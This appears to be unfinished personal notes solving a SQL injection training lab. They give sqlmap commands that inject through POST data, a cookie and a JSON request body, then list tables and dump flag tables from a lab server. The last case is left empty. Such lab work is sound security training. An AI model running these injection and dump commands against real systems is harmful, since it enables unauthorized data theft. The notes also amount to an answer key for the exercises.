1.  What's the contents of table flag2? (Case #2)

- vulnerable in Post data `id`

```sh
❯ sqlmap 'http://167.99.89.94:30884/case2.php'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'Cache-Control: max-age=0'   -H 'Connection: keep-alive'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Origin: http://167.99.89.94:30884'   -H 'Referer: http://167.99.89.94:30884/case2.php'   -H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'   --data-raw 'id=1*'   --compressed --tables
```
- found flag2 and user table

```sh
❯ sqlmap ... -T flag2 --dump
```

---

2. What's the contents of table flag3? (Case #3)

- vulnerable in cookie value `id`

```sh
❯ sqlmap 'http://167.99.89.94:30884/case3.php'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'Connection: keep-alive'   -H 'Cookie: id=1*'   -H 'Referer: http://167.99.89.94:30884/case3.php'   -H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'   --compressed --tables
```
- found flag3 and user table

```sh
❯ sqlmap ...  -T flag3 --dump
```
---

3. What's the contents of table flag4? (Case #4)

- vulnerable in JSON data {"id": 1}
- write case4.txt file as below
```
POST /case4.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 8
Content-Type: application/json
Host: 167.99.89.94:32587
Origin: http://167.99.89.94:32587
Referer: http://167.99.89.94:32587/case4.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

{"id":1*}
```

```sh
sqlmap -r case4.txt --tables
sqlmap -r case4.txt -T flag4 --dump
```

---

4. What's the contents of table flag5? (Case #5)

```

```

5. 